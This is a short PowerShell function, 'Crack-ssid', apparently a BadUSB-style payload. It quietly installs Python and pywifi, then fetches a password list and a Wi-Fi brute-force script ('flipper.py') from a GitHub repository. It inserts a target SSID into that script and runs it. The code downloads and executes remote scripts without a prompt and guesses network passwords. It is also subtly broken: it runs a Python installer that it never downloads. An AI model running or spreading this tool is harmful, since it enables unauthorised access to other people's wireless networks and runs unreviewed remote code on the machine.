function Crack-ssid {
    param (
        [string]$ssid
    )

    # Download Python installer
    $pythonInstallerUrl = "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe"
    $pythonInstallerPath = "$env:TEMP\python_installer.exe"

    # Install Python
    Start-Process -Wait -FilePath $pythonInstallerPath -ArgumentList "/quiet", "PrependPath=1"

    # Install pip
    python -m ensurepip

    
    pip install comtypes
    pip install pywifi

    # Download pass.txt from the URL and save it to the user's temp directory
    $passUrl = 'https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt'
    $passFilePath = "$env:TEMP\pass.txt"
    Invoke-WebRequest -Uri $passUrl -OutFile $passFilePath -UseBasicParsing

    # Download flipper.py from the URL and save it to the user's temp directory
    $flipperUrl = 'https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py'
    $flipperFilePath = "$env:TEMP\flipper.py"
    Invoke-WebRequest -Uri $flipperUrl -OutFile $flipperFilePath -UseBasicParsing

    # Replace "YOUR_SSID_HERE" with the provided SSID
    (Get-Content $flipperFilePath) -replace 'YOUR_SSID_HERE', $ssid | Set-Content $flipperFilePath

    # Run the Python script with the updated SSID
    python $flipperFilePath
}

# Crack-ssid -ssid "YOUR_SSID_HERE"
